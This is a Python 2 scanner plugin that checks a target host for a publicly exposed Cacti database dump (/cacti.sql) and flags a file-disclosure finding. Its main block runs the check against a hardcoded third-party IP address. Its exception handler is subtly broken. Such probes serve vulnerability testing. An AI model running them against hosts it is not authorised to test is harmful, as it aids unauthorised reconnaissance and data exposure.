#!/usr/bin/env python
# encoding: utf-8
from t import T

import requests,urllib2,json,urlparse
class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        target_url = "http://"+ip+":"+str(port)+"/cacti.sql"
        result = {}
        result['result']=False
        r=None
        try:
            r=requests.get(url=target_url,timeout=2)
            if r.status_code==200:
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='cacti file disclosure'
                result['VerifyInfo']['URL'] =ip+"/cacti.sql"
                result['VerifyInfo']['payload']='IP/cacti.sql'
                result['VerifyInfo']['result'] =''
            else:
                pass
        except Exception,e:
            print e.text
        finally:
            if r is not None:
                r.close()
                del r
            return result
if __name__ == '__main__':
    print P().verify(ip='140.114.108.4',port='80')          
